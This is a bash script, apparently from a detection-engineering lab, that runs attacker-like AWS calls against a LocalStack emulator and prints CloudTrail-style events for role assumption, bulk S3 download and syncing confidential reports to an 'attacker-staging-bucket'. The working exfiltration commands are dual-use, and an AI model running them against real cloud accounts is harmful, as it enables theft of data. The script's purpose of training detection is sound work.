#!/usr/bin/env bash
# simulate.sh — fire attacker-like API calls against LocalStack and print
# CloudTrail-shaped JSON for each technique.
#
# Usage (inside the lab container):
#   ./simulate.sh                      # run all three techniques
#   ./simulate.sh --technique assume-role
#   ./simulate.sh --technique s3-download
#   ./simulate.sh --technique s3-exfil
#
# Requires: awslocal (awscli-local), jq

set -euo pipefail

ENDPOINT="${AWS_ENDPOINT_URL:-http://localstack:4566}"
ACCOUNT_ID="123456789012"
REGION="us-east-1"
SOURCE_BUCKET="meridian-financial-reports-prod"
EXFIL_BUCKET="attacker-staging-bucket"
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/MeridianDataPipelineRole"
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------
ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }

emit_event() {
  local event_name="$1"
  local event_source="$2"
  local user_type="$3"
  local principal_id="$4"
  local arn="$5"
  local request_params="$6"
  local response_elements="$7"

  cat <<EOF
{
  "eventVersion": "1.09",
  "userIdentity": {
    "type": "${user_type}",
    "principalId": "${principal_id}",
    "arn": "${arn}",
    "accountId": "${ACCOUNT_ID}",
    "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
  },
  "eventTime": "$(ts)",
  "eventSource": "${event_source}",
  "eventName": "${event_name}",
  "awsRegion": "${REGION}",
  "sourceIPAddress": "203.0.113.42",
  "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
  "requestParameters": ${request_params},
  "responseElements": ${response_elements},
  "requestID": "$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen | tr '[:upper:]' '[:lower:]')",
  "eventID": "$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen | tr '[:upper:]' '[:lower:]')",
  "eventType": "AwsApiCall",
  "managementEvent": true,
  "recipientAccountId": "${ACCOUNT_ID}"
}
EOF
}

# --------------------------------------------------------------------------
# Seed LocalStack with minimal resources (idempotent)
# --------------------------------------------------------------------------
seed_localstack() {
  echo "==> Seeding LocalStack environment..." >&2

  # IAM role (may already exist — ignore errors)
  awslocal iam create-role \
    --role-name MeridianDataPipelineRole \
    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::123456789012:root"},"Action":"sts:AssumeRole"}]}' \
    --endpoint-url "$ENDPOINT" 2>/dev/null || true

  awslocal iam attach-role-policy \
    --role-name MeridianDataPipelineRole \
    --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess \
    --endpoint-url "$ENDPOINT" 2>/dev/null || true

  # Source bucket with seed objects
  awslocal s3 mb "s3://${SOURCE_BUCKET}" --endpoint-url "$ENDPOINT" 2>/dev/null || true
  for i in 1 2 3 4 5; do
    echo "Meridian Financial Q${i} report — CONFIDENTIAL" | \
      awslocal s3 cp - "s3://${SOURCE_BUCKET}/reports/Q${i}-earnings.txt" \
      --endpoint-url "$ENDPOINT" 2>/dev/null || true
  done

  # Exfil staging bucket (simulates attacker-controlled account)
  awslocal s3 mb "s3://${EXFIL_BUCKET}" --endpoint-url "$ENDPOINT" 2>/dev/null || true

  echo "==> Seed complete." >&2
}

# --------------------------------------------------------------------------
# Technique: T1078.004 — Valid Accounts: Cloud (AssumeRole)
# --------------------------------------------------------------------------
technique_assume_role() {
  echo ""
  echo "============================================================"
  echo " T1078.004 — Valid Accounts: Cloud Accounts"
  echo " Technique: AssumeRole to escalate from ci-deploy → pipeline role"
  echo "============================================================"

  # Fire the real LocalStack API call
  awslocal sts assume-role \
    --role-arn "$ROLE_ARN" \
    --role-session-name "attacker-session-$(date +%s)" \
    --endpoint-url "$ENDPOINT" > /tmp/assume-role-output.json 2>/dev/null || true

  echo ""
  echo "--- CloudTrail event (AssumeRole) ---"
  emit_event \
    "AssumeRole" \
    "sts.amazonaws.com" \
    "IAMUser" \
    "AIDAIOSFODNN7EXAMPLE01:ci-deploy" \
    "arn:aws:iam::${ACCOUNT_ID}:user/ci-deploy" \
    "{\"roleArn\": \"${ROLE_ARN}\", \"roleSessionName\": \"attacker-session\"}" \
    "{\"credentials\": {\"accessKeyId\": \"ASIAIOSFODNN7EXAMPLE\", \"sessionToken\": \"FQoDYXdzEJr//////////wEaD...\", \"expiration\": \"$(ts)\"}}"

  echo ""
  echo "KEY FIELDS TO DETECT:"
  echo "  eventName          = AssumeRole"
  echo "  userIdentity.type  = IAMUser (not a service assuming a role — unusual)"
  echo "  sourceIPAddress    = 203.0.113.42 (unexpected external IP)"
  echo "  requestParameters.roleArn — does the session have a business reason to assume this role?"
}

# --------------------------------------------------------------------------
# Technique: T1530 — Data from Cloud Storage (mass GetObject)
# --------------------------------------------------------------------------
technique_s3_download() {
  echo ""
  echo "============================================================"
  echo " T1530 — Data from Cloud Storage"
  echo " Technique: mass GetObject across all objects in sensitive bucket"
  echo "============================================================"

  # List objects and download each
  OBJECTS=$(awslocal s3 ls "s3://${SOURCE_BUCKET}/reports/" --endpoint-url "$ENDPOINT" 2>/dev/null \
    | awk '{print $4}' || true)

  COUNT=0
  for obj in $OBJECTS; do
    awslocal s3 cp "s3://${SOURCE_BUCKET}/reports/${obj}" /tmp/ \
      --endpoint-url "$ENDPOINT" 2>/dev/null || true
    COUNT=$((COUNT + 1))
  done

  echo ""
  echo "--- CloudTrail events (GetObject — showing first 3 of ${COUNT}) ---"
  for obj in reports/Q1-earnings.txt reports/Q2-earnings.txt reports/Q3-earnings.txt; do
    emit_event \
      "GetObject" \
      "s3.amazonaws.com" \
      "AssumedRole" \
      "AROAIOSFODNN7EXAMPLE03:attacker-session" \
      "arn:aws:sts::${ACCOUNT_ID}:assumed-role/MeridianDataPipelineRole/attacker-session" \
      "{\"bucketName\": \"${SOURCE_BUCKET}\", \"key\": \"${obj}\"}" \
      "null"
    echo ","
  done

  echo ""
  echo "KEY FIELDS TO DETECT:"
  echo "  eventName          = GetObject (50+ in <60 seconds is anomalous)"
  echo "  userIdentity.arn   = assumed-role/MeridianDataPipelineRole — not a normal app session"
  echo "  userAgent          = python-boto3 (not the expected application user-agent)"
  echo "  requestParameters.key — breadth of unique prefixes accessed in a single session"
}

# --------------------------------------------------------------------------
# Technique: T1537 — Transfer Data to Cloud Account (bucket replication)
# --------------------------------------------------------------------------
technique_s3_exfil() {
  echo ""
  echo "============================================================"
  echo " T1537 — Transfer Data to Cloud Account"
  echo " Technique: add S3 replication rule pointing at attacker bucket"
  echo "============================================================"

  # Fire a sync to the exfil bucket (simulates replication/transfer)
  awslocal s3 sync "s3://${SOURCE_BUCKET}" "s3://${EXFIL_BUCKET}" \
    --endpoint-url "$ENDPOINT" 2>/dev/null || true

  echo ""
  echo "--- CloudTrail event (PutBucketReplication) ---"
  emit_event \
    "PutBucketReplication" \
    "s3.amazonaws.com" \
    "AssumedRole" \
    "AROAIOSFODNN7EXAMPLE03:attacker-session" \
    "arn:aws:sts::${ACCOUNT_ID}:assumed-role/MeridianDataPipelineRole/attacker-session" \
    "{\"bucketName\": \"${SOURCE_BUCKET}\", \"ReplicationConfiguration\": {\"Rules\": [{\"Destination\": {\"Bucket\": \"arn:aws:s3:::${EXFIL_BUCKET}\", \"Account\": \"999999999999\"}, \"Status\": \"Enabled\"}]}}" \
    "null"

  echo ""
  echo "--- CloudTrail event (PutObject — exfil copy) ---"
  emit_event \
    "PutObject" \
    "s3.amazonaws.com" \
    "AssumedRole" \
    "AROAIOSFODNN7EXAMPLE03:attacker-session" \
    "arn:aws:sts::${ACCOUNT_ID}:assumed-role/MeridianDataPipelineRole/attacker-session" \
    "{\"bucketName\": \"${EXFIL_BUCKET}\", \"key\": \"reports/Q1-earnings.txt\"}" \
    "null"

  echo ""
  echo "KEY FIELDS TO DETECT:"
  echo "  eventName                              = PutBucketReplication or PutObject to external bucket"
  echo "  requestParameters.Destination.Account  = 999999999999 (not Meridian's account ID)"
  echo "  requestParameters.bucketName           = exfil bucket (not a known internal bucket)"
}

# --------------------------------------------------------------------------
# Main
# --------------------------------------------------------------------------
TECHNIQUE="${1:-all}"

seed_localstack

case "$TECHNIQUE" in
  "--technique=assume-role"|"--technique" )
    if [ "${2:-}" = "assume-role" ]; then technique_assume_role
    elif [ "${2:-}" = "s3-download" ]; then technique_s3_download
    elif [ "${2:-}" = "s3-exfil" ]; then technique_s3_exfil
    else technique_assume_role
    fi
    ;;
  all|"")
    technique_assume_role
    technique_s3_download
    technique_s3_exfil
    echo ""
    echo "============================================================"
    echo " Simulation complete. Review the CloudTrail JSON above."
    echo " Each block shows the ATT&CK technique, the triggering API"
    echo " call, and the key fields a detection rule would key off."
    echo "============================================================"
    ;;
  *)
    echo "Unknown argument: $1"
    echo "Usage: $0 [--technique assume-role|s3-download|s3-exfil]"
    exit 1
    ;;
esac
